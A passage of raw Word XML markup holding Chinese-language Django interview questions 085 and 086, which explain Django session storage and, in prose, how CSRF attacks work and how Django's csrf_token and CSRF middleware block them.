          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>协议的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HttpResponse</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50689178" w14:textId="4E1748F6" w:rsidR="00024E97" w:rsidRPr="00CF0D9D" w:rsidRDefault="00D96E02" w:rsidP="00CF0D9D">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
      <w:r w:rsidR="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>085</w:t>
      </w:r>
      <w:r w:rsidR="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的运行机制是什么</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56A18461"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的</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存储可以利用中间件来实现。需要在</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settings.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>文件中注册</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、设置中间件用于启动。设置存储模式（数据库</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缓存</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混合存储）和配置数据库缓存用于存储，生成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django_session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>表单用于读写。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="0D606AA3" w14:textId="7483EA49" w:rsidR="00024E97" w:rsidRPr="00CF0D9D" w:rsidRDefault="00CF0D9D" w:rsidP="00CF0D9D">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086</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>什么是</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，请描述其攻击原理，在</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中如何解决</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E7AA2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lastRenderedPageBreak/>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cross-site request forgery</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）简称跨站请求伪造。例如，你访问了信任网站</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>A,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>然后网站</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>会用保存你的个人信息并返回给你的浏览器一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，然后呢，在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的过期时间之内，你去访问了恶意网站</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，它给你返回一些恶意请求代码，要求你去访问网站</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，而你的浏览器在收到这个恶意请求之后，在你不知情的情况下，会带上保存在本地浏览器的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>信息去访问网站</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，然后网站</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>误以为是用户本身的操作，导致来自恶意网站</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的攻击代码会被执行：发邮件，发消息，修改你的密码，购物，转账，偷窥你的个人信息，导致私人信息泄漏和账户财产安全受到威胁。</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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>post</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求时，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>form</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>表单或</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ajax</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>里添加</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>csrf_token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，服务端开启</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中间件进行验证。</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4078A50A"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解决原理是页面添加</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>csrf_token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>值后，用户通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>访问（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求）该页面时，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>会在响应中自动帮我们生成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>信息，返回给浏览器，同时在前端代码会生成一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>csrf_token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>值，然后当你</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>提交信息时，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>会自动比对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>里和前端</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>form</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>表单或</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ajax</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>提交上来的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>csrf_token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>值，两者一致，说明是当前浏览器发起的正常请求并处理业务逻辑返回响应，那么第三方网站拿到你的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>值为什么不能通过验证呢，因为他没你前端的那个随机生成的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>值，他总不能跑到你电脑面前查看你的浏览器前端页面自动随机生成的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>值吧。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
